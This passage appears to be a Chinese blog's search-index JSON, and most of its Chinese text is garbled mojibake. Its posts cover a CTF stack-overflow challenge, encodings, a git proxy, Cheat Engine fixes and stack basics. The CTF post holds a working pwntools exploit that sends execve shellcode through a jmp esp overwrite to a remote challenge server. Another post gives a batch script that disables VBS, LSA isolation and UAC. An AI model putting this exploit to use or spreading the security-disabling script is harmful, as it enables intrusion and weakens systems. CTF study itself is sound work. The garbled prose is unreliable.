byte-0000000000000009 // padding byte-0000000000000008 // padding byte-0000000000000007 // padding byte-0000000000000006 // padding byte-0000000000000005 // padding byte-0000000000000004 // padding byte-0000000000000003 // padding byte-0000000000000002 // padding byte-0000000000000001 // padding byte+0000000000000000 _DWORD __saved_registers;+0000000000000004 _UNKNOWN *__return_address; ä» __return_address åˆ° s æ˜¯24ä¸ªå­—èŠ‚ ä½†æ˜¯æˆ‘ä»¬ä¸­é—´è¿˜åŠ äº†ä¸€ä¸ª jmp esp è¿™åˆå  å››ä¸ªå­—èŠ‚ æ‰€ä»¥æˆ‘ä»¬éœ€è¦å†™æˆè¿™æ · sub esp,0x28; jmp esp è¿™æ ·æ‰å¯¹ ä¹‹åæˆ‘ä»¬çš„payloadå°±æ„é€ å®Œæˆäº† è„šæœ¬å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637from pwn import*# p = process(&quot;b0verfl0w&quot;)p = remote(&quot;node5.buuoj.cn&quot;,28176)shellcode = b&quot;\\x31\\xc0\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xb0\\x0b\\xcd\\x80&quot;shellcode_len = len(shellcode) # shellcode_len = 23print(shellcode_len)jmp_esp = 0x08048504sub_esp_jmp = asm(&#x27;sub esp,0x28;jmp esp&#x27;)# 0: 83 ec 28 sub $0x28,%esp# 3: ff e4 jmp *%espprint(sub_esp_jmp)sub_len = len(sub_esp_jmp)payload = shellcode #å¾€æ ˆä¸Šå†™shellcode#è¡¥å¡«å­—èŠ‚åˆ°æº¢å‡ºç‚¹ æº¢å‡ºç‚¹ = 36 åº”è¯¥æ˜¯è¡¥å¡«äº† 36-23 = 13payload += (0x24-shellcode_len) * b&#x27;a&#x27;#æ ¹æ® retçš„ç‰¹æ€§ é¦–å…ˆæ˜¯å…ˆjmp esp ä¹‹å add esp,4 æˆ‘ä»¬å¯ä»¥è®©ä»–å…ˆæ‰§è¡Œå®Œ add esp,4 ç„¶åè¿›è¡Œjmp esppayload += p32(jmp_esp)#è·³å›æ ˆé¡¶payload += sub_esp_jmpp.sendline(payload)p.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"å‡¯æ’’å¯†ç è§£æ","slug":"å‡¯æ’’å¯†ç è§£æ","date":"2025-06-03T05:40:06.000Z","updated":"2025-06-03T05:45:55.926Z","comments":true,"path":"2025/06/03/å‡¯æ’’å¯†ç è§£æ/","permalink":"http://example.com/2025/06/03/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81%E8%A7%A3%E6%9E%90/","excerpt":"","text":"åŠ å¯†æ–¹æ³•æŠŠæ˜æ–‡ä¸­æ‰€æœ‰å­—æ¯éƒ½åœ¨å­—æ¯è¡¨ä¸Šå‘åæˆ–è€…å‘å‰æŒ‰ç…§ä¸€ä¸ªå›ºå®šæ•°ç›®è¿›è¡Œåç§»åè¢«æ›¿æ¢æˆå¯†æ–‡ ä»£ç å®ç°","categories":[],"tags":[{"name":"å‡¯æ’’å¯†ç ","slug":"å‡¯æ’’å¯†ç ","permalink":"http://example.com/tags/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81/"}]},{"title":"BASEç¼–ç è§£æ","slug":"BASEç¼–ç è§£æ","date":"2025-06-03T05:17:26.000Z","updated":"2025-06-03T05:44:49.114Z","comments":true,"path":"2025/06/03/BASEç¼–ç è§£æ/","permalink":"http://example.com/2025/06/03/BASE%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90/","excerpt":"BASEç³»åˆ—ç¼–ç  å…ˆå°†å¾…ç¼–ç å­—ç¬¦æŒ‰ç…§ASCIIç¼–ç è½¬æ¢æˆ8bitäºŒè¿›åˆ¶å½¢å¼ å†å°†äºŒè¿›åˆ¶åºåˆ—åˆ‡ç‰‡ç»„åˆï¼Œé‡ç»„ä¸ºè‹¥å¹²ä¸ªç­‰é•¿çš„äºŒè¿›åˆ¶ç»„ å°†æ¯ä¸ªäºŒè¿›åˆ¶ç»„è½¬æ¢æˆåè¿›åˆ¶æ•°å­—ï¼Œå¹¶æŸ¥è¡¨æ‰¾åˆ°å¯¹åº”çš„å¯æ‰“å°ASCIIå­—ç¬¦ é‡ç»„è‹¥ä¸è¶³åˆ™è¡¥0 å¹¶å°†å…¶ç¼–ç ä¸ºâ€˜&#x3D;â€™","text":"BASEç³»åˆ—ç¼–ç  å…ˆå°†å¾…ç¼–ç å­—ç¬¦æŒ‰ç…§ASCIIç¼–ç è½¬æ¢æˆ8bitäºŒè¿›åˆ¶å½¢å¼ å†å°†äºŒè¿›åˆ¶åºåˆ—åˆ‡ç‰‡ç»„åˆï¼Œé‡ç»„ä¸ºè‹¥å¹²ä¸ªç­‰é•¿çš„äºŒè¿›åˆ¶ç»„ å°†æ¯ä¸ªäºŒè¿›åˆ¶ç»„è½¬æ¢æˆåè¿›åˆ¶æ•°å­—ï¼Œå¹¶æŸ¥è¡¨æ‰¾åˆ°å¯¹åº”çš„å¯æ‰“å°ASCIIå­—ç¬¦ é‡ç»„è‹¥ä¸è¶³åˆ™è¡¥0 å¹¶å°†å…¶ç¼–ç ä¸ºâ€˜&#x3D;â€™ æ ¹æ®åˆ†ç»„é•¿åº¦çš„ä¸åŒ (4bitã€5bitã€6bit) å¯ä»¥åˆ†ä¸ºä¸‰ç§BASEç¼–ç å½¢å¼ 4bit base16ç¼–ç  å­—æ¯è¡¨ä¸º 0123456789ABCDEF 5bit base32ç¼–ç  å­—æ¯è¡¨ä¸º A-Z 2-7 6bit base64ç¼–ç  å­—æ¯è¡¨ä¸º A-Z a-z 0-9 +&#x2F; ç¤ºä¾‹å¦‚ä¸‹æ‰€ç¤º","categories":[],"tags":[{"name":"ç¼–ç ","slug":"ç¼–ç ","permalink":"http://example.com/tags/%E7%BC%96%E7%A0%81/"}]},{"title":"gitè®¾ç½®ä»£ç†","slug":"gitè®¾ç½®ä»£ç†","date":"2025-05-31T12:30:17.000Z","updated":"2025-05-31T12:34:15.237Z","comments":true,"path":"2025/05/31/gitè®¾ç½®ä»£ç†/","permalink":"http://example.com/2025/05/31/git%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/","excerpt":"ä¸´æ—¶è®¾ç½®æ‰“å¼€ Git Bashï¼Œä½¿ç”¨å‘½ä»¤ä¸´æ—¶è®¾å®šsocksä»£ç†: 123git config --global http.proxy &#x27;socks5://127.0.0.1:socks5ç«¯å£å·&#x27; git config --global https.proxy &#x27;socks5://127.0.0.1:socks5ç«¯å£å·&#x27;","text":"ä¸´æ—¶è®¾ç½®æ‰“å¼€ Git Bashï¼Œä½¿ç”¨å‘½ä»¤ä¸´æ—¶è®¾å®šsocksä»£ç†: 123git config --global http.proxy &#x27;socks5://127.0.0.1:socks5ç«¯å£å·&#x27; git config --global https.proxy &#x27;socks5://127.0.0.1:socks5ç«¯å£å·&#x27; æˆ–è€…httpä»£ç†ï¼š 123git config --global http.proxy &#x27;http://127.0.0.1:httpç«¯å£å·&#x27; git config --global https.proxy &#x27;https://127.0.0.1:httpsç«¯å£å·&#x27; æ°¸ä¹…è®¾ç½®è‹¥æƒ³è¦è®¾ç½®ä»£ç†æ°¸ä¹…ç”Ÿæ•ˆï¼Œåˆ™å¯ä»¥æŠŠå®ƒå†™å…¥ .gitconfig æ–‡ä»¶ä¸­ã€‚ ä½¿ç”¨ vi æ‰“å¼€ .gitconfig æ–‡ä»¶ï¼š 1vi ~/.gitconfig å†™å…¥ä¸‹åˆ—é…ç½®(å»ºè®®åœ¨æœ€æœ«å†™å…¥)ï¼š 123456789[http] proxy = socks5://127.0.0.1:socks5ç«¯å£å·proxy = http://127.0.0.1:httpç«¯å£å· [https] proxy = socks5://127.0.0.1:socks5ç«¯å£å·proxy = https://127.0.0.1:httpç«¯å£å· ä¿®æ”¹åé‡å¯ git ï¼Œä½¿é…ç½®ç”Ÿæ•ˆï¼š 1git config -l --global æŸ¥çœ‹å½“å‰ä»£ç†ï¼š 1git config -l å¯ä»¥çœ‹åˆ°è‡ªå·±æ‰€é…ç½®çš„ç«¯å£ä¿¡æ¯ï¼Œåˆ™è¯´æ˜é…ç½®æˆåŠŸã€‚ åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/m0_57567093/article/details/127455214","categories":[],"tags":[]},{"title":"å…³äºCheatEngineæç¤ºDBVMæ— æ³•å¯åŠ¨ä»¥åŠVMwareæç¤ºæ­¤å¹³å°ä¸æ”¯æŒè™šæ‹ŸåŒ–çš„è§£å†³æ–¹æ¡ˆ","slug":"å…³äºCheatEngineæç¤ºDBVMæ— æ³•å¯åŠ¨ä»¥åŠVMwareæç¤ºæ­¤å¹³å°ä¸æ”¯æŒè™šæ‹ŸåŒ–çš„è§£å†³æ–¹æ¡ˆ","date":"2025-05-31T12:19:17.000Z","updated":"2025-05-31T12:51:02.438Z","comments":true,"path":"2025/05/31/å…³äºCheatEngineæç¤ºDBVMæ— æ³•å¯åŠ¨ä»¥åŠVMwareæç¤ºæ­¤å¹³å°ä¸æ”¯æŒè™šæ‹ŸåŒ–çš„è§£å†³æ–¹æ¡ˆ/","permalink":"http://example.com/2025/05/31/%E5%85%B3%E4%BA%8ECheatEngine%E6%8F%90%E7%A4%BADBVM%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BB%A5%E5%8F%8AVMware%E6%8F%90%E7%A4%BA%E6%AD%A4%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%94%AF%E6%8C%81%E8%99%9A%E6%8B%9F%E5%8C%96%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/","excerpt":"ç¯å¢ƒ windows11 24h2 å…¶å®ƒç³»ç»Ÿåº”è¯¥æ˜¯é€šç”¨ æ­¥éª¤1 é¦–å…ˆæ‰“å¼€æ§åˆ¶é¢æ¿-ç¨‹åº-å¯åŠ¨æˆ–å…³é—­WindowsåŠŸèƒ½ åƒè¿™æ ·å…³é—­è¿™äº›: ç„¶åå†æ‰¾åˆ°æœåŠ¡ç¦ç”¨ä»¥ä¸‹åŠŸèƒ½","text":"ç¯å¢ƒ windows11 24h2 å…¶å®ƒç³»ç»Ÿåº”è¯¥æ˜¯é€šç”¨ æ­¥éª¤1 é¦–å…ˆæ‰“å¼€æ§åˆ¶é¢æ¿-ç¨‹åº-å¯åŠ¨æˆ–å…³é—­WindowsåŠŸèƒ½ åƒè¿™æ ·å…³é—­è¿™äº›: ç„¶åå†æ‰¾åˆ°æœåŠ¡ç¦ç”¨ä»¥ä¸‹åŠŸèƒ½ ä¹‹åå†è®¾ç½®é‡Œé¢æœç´¢å†…æ ¸éš”ç¦»ç„¶åæŠŠå†…æ ¸éš”ç¦»çš„æ‰€æœ‰é€‰é¡¹å…³é—­ é‡å¯ç”µè„‘å°è¯•å³å¯ è‹¥è¿˜æ˜¯ä¸è¡Œè¯·çœ‹æ­¥éª¤2 æ­¥éª¤2 [æ¥è‡ª](VMware Workstationï¼šå¦‚ä½•è§£å†³æ‰“å¼€è™šæ‹Ÿæœºå‡ºç°â€œæ­¤å¹³å°ä¸æ”¯æŒè™šæ‹ŸåŒ–çš„Intel VT-x&#x2F;EPTâ€çš„æŠ¥é”™é—®é¢˜ - VMæŠ€æœ¯åº“)è¿è¡Œmsinfo32.exeå‘½ä»¤ï¼Œç¡®è®¤Windows 11çš„å®¿ä¸»æœºæ˜¯å¦å¼€å¯äº†VBSï¼Œå¦‚æœâ€åŸºäºè™šæ‹ŸåŒ–çš„å®‰å…¨â€œé‚£ä¸€è¡Œåé¢æ˜¾ç¤ºæ˜¯â€œæœªå¯ç”¨â€ï¼Œæœ¬æ–‡å†…å®¹ä¸é€‚åˆã€‚å¦‚æœæ˜¾ç¤ºâ€œæ­£åœ¨è¿è¡Œâ€ï¼Œè¯·ç»§ç»­ç¬¬2æ­¥ã€‚ ä¹‹åæ‰§è¡Œä»¥ä¸‹è„šæœ¬ å†™å‡ºä¸€ä¸ªbatæ–‡ä»¶å³å¯ è®°å¾—è¦ç®¡ç†å‘˜è¿è¡Œ 1234567891011121314151617181920212223242526272829303132333435363738@echo offdism /Online /Disable-Feature:microsoft-hyper-v-all /NoRestartdism /Online /Disable-Feature:IsolatedUserMode /NoRestartdism /Online /Disable-Feature:Microsoft-Hyper-V-Hypervisor /NoRestartdism /Online /Disable-Feature:Microsoft-Hyper-V-Online /NoRestartdism /Online /Disable-Feature:HypervisorPlatform /NoRestartREM ===========================================mountvol X: /scopy %WINDIR%\\System32\\SecConfig.efi X:\\EFI\\Microsoft\\Boot\\SecConfig.efi /Ybcdedit /create &#123;0cb3b571-2f2e-4343-a879-d86a476d7215&#125; /d &quot;DebugTool&quot; /application osloaderbcdedit /set &#123;0cb3b571-2f2e-4343-a879-d86a476d7215&#125; path &quot;\\EFI\\Microsoft\\Boot\\SecConfig.efi&quot;bcdedit /set &#123;bootmgr&#125; bootsequence &#123;0cb3b571-2f2e-4343-a879-d86a476d7215&#125;bcdedit /set &#123;0cb3b571-2f2e-4343-a879-d86a476d7215&#125; loadoptions DISABLE-LSA-ISO,DISABLE-VBSbcdedit /set &#123;0cb3b571-2f2e-4343-a879-d86a476d7215&#125; device partition=X:mountvol X: /dbcdedit /set hypervisorlaunchtype offREG DELETE HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard /v EnableVirtualizationBasedSecurity /fecho å…³é—­UACé€šçŸ¥reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System&quot; /f /v &quot;EnableLUA&quot; /t REG_DWORD /d 0reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Security Center&quot; /f /v &quot;UacDisableNotify&quot; /t REG_DWORD /d 1echo.echo.echo.echo.echo æ¥ä¸‹æ¥ï¼é‡æ–°å¯åŠ¨æ‚¨çš„ç”µè„‘ï¼å®Œæˆå‰©ä¸‹çš„æ“ä½œã€‚echo è¯·æ³¨æ„ï¼é‡å¯æ—¶çš„å±å¹•æç¤ºï¼echo è¯·é‡å¯ï¼è¿‡äº†BIosè‡ªæ£€ä¹‹åï¼çœ‹åˆ°é»‘ç™½å­—ç¬¦æç¤ºä½ æŒ‰é”®çš„æ—¶å€™echo è¯·æ­»æŒ‰ï¼Œç‹‚æŒ‰ F3é”®ï¼Œè‡ªåŠ¨é‡å¯ä¸ºæ­¢ï¼!echo å¯ä»¥å…³é—­æ­¤çª—å£äº†ï¼Œé‡å¯ç”µè„‘å§ã€‚ã€‚ã€‚pause &gt; nulecho.echo. è¿™æ ·å°±æ˜¯æˆåŠŸäº† äº²æµ‹æœ‰æ•ˆ è„šæœ¬æ²¡é—®é¢˜ æœ¬äººä¹Ÿæ˜¯è¢«è¿™ä¸ªé—®é¢˜å›°æ‰°äº†å¾ˆä¹…å¾ˆä¹…","categories":[],"tags":[]},{"title":"PWN-ç®€å•æ ˆæº¢å‡º","slug":"PWN-ç®€å•æ ˆæº¢å‡º","date":"2025-05-30T06:58:02.000Z","updated":"2025-06-06T02:12:42.615Z","comments":true,"path":"2025/05/30/PWN-ç®€å•æ ˆæº¢å‡º/","permalink":"http://example.com/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/","excerpt":"PWN-ç®€å•æ ˆæº¢å‡ºä»‹ç»pwnè¿™é—¨è¯¾ç¨‹ç®€å•æ¥è¯´å°±æ˜¯é€šè¿‡äºŒè¿›åˆ¶çš„å½¢å¼å»æ‰¾åˆ°æŸå°æœåŠ¡å™¨å­˜åœ¨å“ªäº›æ¼æ´ ä¸webä¸åŒçš„æ˜¯ä»–å¤§éƒ¨åˆ†çš„çŸ¥è¯†éƒ½æ˜¯åŸºäºæ±‡ç¼–ç»„æˆçš„ åœ¨ CTF-Wiki é‡Œé¢çš„ä»‹ç»åˆ™æ˜¯è¿™æ ·çš„: æ ˆæº¢å‡ºæŒ‡çš„æ˜¯ç¨‹åºå‘æ ˆä¸­æŸä¸ªå˜é‡ä¸­å†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†è¿™ä¸ªå˜é‡æœ¬èº«æ‰€ç”³è¯·çš„å­—èŠ‚æ•°ï¼Œå› è€Œå¯¼è‡´ä¸å…¶ç›¸é‚»çš„æ ˆä¸­çš„å˜é‡çš„å€¼è¢«æ”¹å˜ã€‚è¿™ç§é—®é¢˜æ˜¯ä¸€ç§ç‰¹å®šçš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œç±»ä¼¼çš„è¿˜æœ‰å †æº¢å‡ºï¼Œbss æ®µæº¢å‡ºç­‰æº¢å‡ºæ–¹å¼ã€‚æ ˆæº¢å‡ºæ¼æ´è½»åˆ™å¯ä»¥ä½¿ç¨‹åºå´©æºƒï¼Œé‡åˆ™å¯ä»¥ä½¿æ”»å‡»è€…æ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬ä¹Ÿä¸éš¾å‘ç°ï¼Œå‘ç”Ÿæ ˆæº¢å‡ºçš„åŸºæœ¬å‰ææ˜¯ï¼š ç¨‹åºå¿…é¡»å‘æ ˆä¸Šå†™å…¥æ•°æ®ã€‚ å†™å…¥çš„æ•°æ®å¤§å°æ²¡æœ‰è¢«è‰¯å¥½åœ°æ§åˆ¶ã€‚","text":"PWN-ç®€å•æ ˆæº¢å‡ºä»‹ç»pwnè¿™é—¨è¯¾ç¨‹ç®€å•æ¥è¯´å°±æ˜¯é€šè¿‡äºŒè¿›åˆ¶çš„å½¢å¼å»æ‰¾åˆ°æŸå°æœåŠ¡å™¨å­˜åœ¨å“ªäº›æ¼æ´ ä¸webä¸åŒçš„æ˜¯ä»–å¤§éƒ¨åˆ†çš„çŸ¥è¯†éƒ½æ˜¯åŸºäºæ±‡ç¼–ç»„æˆçš„ åœ¨ CTF-Wiki é‡Œé¢çš„ä»‹ç»åˆ™æ˜¯è¿™æ ·çš„: æ ˆæº¢å‡ºæŒ‡çš„æ˜¯ç¨‹åºå‘æ ˆä¸­æŸä¸ªå˜é‡ä¸­å†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†è¿™ä¸ªå˜é‡æœ¬èº«æ‰€ç”³è¯·çš„å­—èŠ‚æ•°ï¼Œå› è€Œå¯¼è‡´ä¸å…¶ç›¸é‚»çš„æ ˆä¸­çš„å˜é‡çš„å€¼è¢«æ”¹å˜ã€‚è¿™ç§é—®é¢˜æ˜¯ä¸€ç§ç‰¹å®šçš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œç±»ä¼¼çš„è¿˜æœ‰å †æº¢å‡ºï¼Œbss æ®µæº¢å‡ºç­‰æº¢å‡ºæ–¹å¼ã€‚æ ˆæº¢å‡ºæ¼æ´è½»åˆ™å¯ä»¥ä½¿ç¨‹åºå´©æºƒï¼Œé‡åˆ™å¯ä»¥ä½¿æ”»å‡»è€…æ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬ä¹Ÿä¸éš¾å‘ç°ï¼Œå‘ç”Ÿæ ˆæº¢å‡ºçš„åŸºæœ¬å‰ææ˜¯ï¼š ç¨‹åºå¿…é¡»å‘æ ˆä¸Šå†™å…¥æ•°æ®ã€‚ å†™å…¥çš„æ•°æ®å¤§å°æ²¡æœ‰è¢«è‰¯å¥½åœ°æ§åˆ¶ã€‚ åˆ™ æ ˆçš„ä»‹ç»å¦‚ä¸‹ï¼š åŸºæœ¬æ ˆä»‹ç» Â¶ æ ˆæ˜¯ä¸€ç§å…¸å‹çš„åè¿›å…ˆå‡º (Last in First Out) çš„æ•°æ®ç»“æ„ï¼Œå…¶æ“ä½œä¸»è¦æœ‰å‹æ ˆ (push) ä¸å‡ºæ ˆ (pop) ä¸¤ç§æ“ä½œï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼ˆç»´åŸºç™¾ç§‘ï¼‰ã€‚ä¸¤ç§æ“ä½œéƒ½æ“ä½œæ ˆé¡¶ï¼Œå½“ç„¶ï¼Œå®ƒä¹Ÿæœ‰æ ˆåº•ã€‚ é«˜çº§è¯­è¨€åœ¨è¿è¡Œæ—¶éƒ½ä¼šè¢«è½¬æ¢ä¸ºæ±‡ç¼–ç¨‹åºï¼Œåœ¨æ±‡ç¼–ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå……åˆ†åˆ©ç”¨äº†è¿™ä¸€æ•°æ®ç»“æ„ã€‚æ¯ä¸ªç¨‹åºåœ¨è¿è¡Œæ—¶éƒ½æœ‰è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œå…¶ä¸­æŸä¸€éƒ¨åˆ†å°±æ˜¯è¯¥ç¨‹åºå¯¹åº”çš„æ ˆï¼Œç”¨äºä¿å­˜å‡½æ•°è°ƒç”¨ä¿¡æ¯å’Œå±€éƒ¨å˜é‡ã€‚æ­¤å¤–ï¼Œå¸¸è§çš„æ“ä½œä¹Ÿæ˜¯å‹æ ˆä¸å‡ºæ ˆã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç¨‹åºçš„æ ˆæ˜¯ä»è¿›ç¨‹åœ°å€ç©ºé—´çš„é«˜åœ°å€å‘ä½åœ°å€å¢é•¿çš„ã€‚ è¿™äº›æ˜¯ç®€å•çš„æ ˆä»‹ç» é¦–å…ˆ æ ˆæ˜¯ä¸€ç§ç‰¹æ®Šçš„æ•°æ®ç»“æ„ ä»–å­˜å‚¨äº† function runtime çš„å‚æ•°ã€å˜é‡å’Œè¿”å›åœ°å€ä»–åœ¨ä¸€æ¬¡å‡½æ•°è°ƒç”¨ä¸­æ˜¯ä¸å¯æˆ–ç¼ºçš„é‡è¦éƒ¨åˆ†ï¼Œå…¶ä¸­è½¯ä»¶çš„æ¶æ„åˆåˆ†ä¸ºä¸¤ç§ x86 å’Œ x64 è¿™ä¸¤ç§åœ¨å‚æ•°å’Œå˜é‡çš„åœ¨æ ˆå­˜å‚¨å½¢å¼ä¸Šæœ‰äº›ä¸åŒ ä¾‹å¦‚ x86 çš„æ‰€æœ‰å‚æ•°é€šè¿‡ æ ˆ ä»å³åˆ°å·¦ä¾æ¬¡å‹å…¥ å¯ç”¨ä»¥ä¸‹ä»£ç ä½œä¸ºç¤ºä¾‹ ä½¿ç”¨ visual stdio ç¼–è¯‘ x86 ç‰ˆæœ¬è§‚æŸ¥æ ˆ 123456789101112131415#include &lt;iostream&gt;int func(int _param1, int _param2, int _param3, int _param4, int _param5) &#123; return _param1 + _param2 + _param3 + _param4 + _param5;&#125;int main()&#123; func(1, 2, 3, 4, 5); std::cout &lt;&lt; &quot;helloworld\\n&quot;; getchar();&#125; å¦‚å›¾æ‰€ç¤º æˆ‘ä»¬å®šä½åˆ°äº† main å‡½æ•° ç„¶åæˆ‘ä»¬åœ¨ func å¤„ä¸‹æ–­ç‚¹ æˆ‘ä»¬è®©ä»–ç»§ç»­æ‰§è¡Œåˆ°func æ‰§è¡Œåˆ° callçš„æ—¶å€™æˆ‘ä»¬è§‚å¯Ÿæ ˆçš„å˜åŒ– å¦‚å›¾æ‰€ç¤º è¿™æ˜¯ä¸€ä¸ªä»ä½åœ°å€åˆ°é«˜åœ°å€çš„æ˜¾ç¤ºæ–¹å¼ ä½†æ˜¯åœ¨å…¥æ ˆçš„æ—¶å€™ ä»–æ˜¯ ä»é«˜åœ°å€åˆ°ä½åœ°å€ä»å³å¾€å·¦å‚æ•°ä¾æ¬¡å…¥æ ˆ ç„¶åæˆ‘ä»¬è¿›å…¥callç»§ç»­æŸ¥çœ‹ è¿›å…¥callçš„åŒæ—¶æˆ‘ä»¬å‘ç° ä»–å…ˆæ˜¯å‹å…¥äº†ä¸€ä¸ªåœ°å€ è¿™ä¸ªåœ°å€å°±æ˜¯ call æ‰€åœ¨åœ°å€ + 5 çš„å­—èŠ‚ æ‰€ä»¥call xxxxxxxxå°±ç­‰æ•ˆäº push eip + 5 callçš„æœºå™¨ç å ç”¨ä¸€ä¸ªå­—èŠ‚ ç„¶è€Œåœ°å€å ç”¨4ä¸ªå­—èŠ‚ å…¶æ¬¡åˆè·³è½¬åˆ°äº† åé¢çš„åœ°å€å¤„ æ‰€ä»¥callæŒ‡ä»¤åšäº†ä¸¤ä»¶äº‹ å…ˆæ˜¯å‹å…¥ä¸€ä¸ªè¿”å›åœ°å€ æ¥ç€åˆæ˜¯è¿›è¡Œäº†ä¸€æ¬¡ jmp è·³è½¬ ç„¶åæˆ‘ä»¬æ¥ç€çœ‹ åœ¨è·³è½¬è¿‡æ¥çš„å‡½æ•°å¤´éƒ¨æˆ‘ä»¬å‘ç°äº†ä¸¤æ¡æŒ‡ä»¤ push ebp mov ebp esp é‚£ä¹ˆè¿™æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿ å…¶å®æ˜¯ å…¸å‹çš„ x86 å‡½æ•°æ ˆå¸§åˆå§‹åŒ– é¦–å…ˆå°†å½“å‰çš„ ebp å¯„å­˜å™¨çš„å€¼å‹å…¥æ ˆ ä¹Ÿå°±æ˜¯ä¿å­˜ä¸Šä¸ªå‡½æ•°çš„æ ˆåº•åœ°å€ (push ebp) ä¹‹åæŠŠä¸Šä¸ªå‡½æ•°çš„æ ˆé¡¶ä½œä¸ºå½“å‰å‡½æ•°çš„æ ˆåº• (mov ebp esp) ä¹‹åå°±æ˜¯è¿›è¡Œä¸€ç³»ç±»çš„åŠ æ³•æ“ä½œ åˆ°äº† pop ebpçš„æ—¶å€™ å°±è¦é”€æ¯æ­¤æ ˆå¸§æ¢å¤ä¸Šä¸€ä¸ªå‡½æ•°çš„æ ˆå¸§äº† ç„¶è€Œæˆ‘ä»¬å¯ä»¥å‘ç° å‡½æ•°å‚æ•°æ˜¯é€šè¿‡ ebp + n*4 çš„æ–¹å¼è¿›è¡Œè®¿é—®çš„ è¿™å¾ˆå…³é”® ç›´åˆ°æ‰§è¡Œåˆ° ret æˆ‘ä»¬ä¼šå‘ç° ä»–çš„æ•ˆæœå°±ç­‰äº jmp esp &amp; add esp,4 ä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´ æˆ‘ä»¬æ¥ç€åˆ†ææ ˆ æˆ‘ä»¬å¯ä»¥å‘ç°ç°åœ¨ esp=ebp ä¸ºä»€ä¹ˆè¯´ ret æ˜¯ jmp [esp]å‘¢ å› ä¸ºæˆ‘ä»¬æ‰§è¡Œå®Œ pop ebp ä»–å°±å˜æˆäº†è¿™æ · ä¹Ÿå°±æ˜¯è¿”å›åˆ°åˆšæ‰callä¿å­˜çš„è¿”å›å€¼äº† æ¥ç€æˆ‘ä»¬æ¥çœ‹ä¸‹x64çš„æ ˆ x64åˆ†ä¸ºä¸¤ç§ç¼–è¯‘å™¨ åœ¨ Linuxã€FreeBSDã€macOS ä¸­æ™®éä½¿ç”¨ System V AMD64 ABI å‰å…­ä¸ªæ•´å‹æˆ–æŒ‡é’ˆå‚æ•°ä¾æ¬¡ä¿å­˜åœ¨ RDI, RSI, RDX, RCX, R8 å’Œ R9 å¯„å­˜å™¨ä¸­ï¼Œå¦‚æœè¿˜æœ‰æ›´å¤šçš„å‚æ•°çš„è¯æ‰ä¼šä¿å­˜åœ¨æ ˆä¸Šã€‚ å†…å­˜åœ°å€ä¸èƒ½å¤§äº 0x00007FFFFFFFFFFFï¼Œ6 ä¸ªå­—èŠ‚é•¿åº¦ï¼Œå¦åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚ ä½†åœ¨Windowsä¸Šæ˜¯ Microsoft x64 calling convention ä¹Ÿç§°ä½œï¼š Windows x64 ABI Windows x64 è°ƒç”¨çº¦å®š ä»–çš„å‚æ•°å…¥æ ˆå½¢å¼å¦‚ä¸‹ å‰å››ä¸ªæ•´å‹æˆ–æŒ‡é’ˆå‚æ•°ä¾æ¬¡ä¿å­˜åœ¨ RCX, RDX, R8, R9ï¼Œå¦‚æœè¿˜æœ‰æ›´å¤šçš„å‚æ•°çš„è¯æ‰ä¼šä¿å­˜åœ¨æ ˆä¸Šã€‚ å†…å­˜åœ°å€ä¸èƒ½å¤§äº 0x00007FFFFFFFFFFFï¼Œ6 ä¸ªå­—èŠ‚é•¿åº¦ï¼Œå¦åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚ ğŸ” System V AMD64 ABI vs Microsoft x64 ABI å¯¹æ¯” ç‰¹æ€§ System V AMD64 ABI (Linux&#x2F;macOS) Microsoft x64 ABI (Windows x64) å‚æ•°ä¼ é€’å¯„å­˜å™¨ RDI, RSI, RDX, RCX, R8, R9 RCX, RDX, R8, R9 è¿”å›å€¼ RAX RAX æ ˆç©ºé—´ è¢«è°ƒç”¨è€…å¿…é¡»ä¿ç•™ red zoneï¼ˆ128 å­—èŠ‚ï¼‰ æ—  red zoneï¼ˆä¸èƒ½ç”¨æ ˆä¸‹æ–¹ç©ºé—´ï¼‰ è°ƒç”¨è€…ä¿å­˜ï¼ˆvolatileï¼‰å¯„å­˜å™¨ RAX, RCX, RDX, RSI, RDI, R8â€“R11 RAX, RCX, RDX, R8â€“R11 è¢«è°ƒç”¨è€…ä¿å­˜ï¼ˆcallee-savedï¼‰ RBX, RBP, R12â€“R15 RBX, RBP, RDI, RSI, R12â€“R15 å‚æ•°è¶…è¿‡å¯„å­˜å™¨ ä»ç¬¬ 7 ä¸ªå‚æ•°èµ·å‹æ ˆ ä»ç¬¬ 5 ä¸ªå‚æ•°èµ·å‹æ ˆ æ ˆå¯¹é½è¦æ±‚ 16 å­—èŠ‚ 16 å­—èŠ‚ æ ˆä¼ å‚å¯¹é½æ–¹å¼ 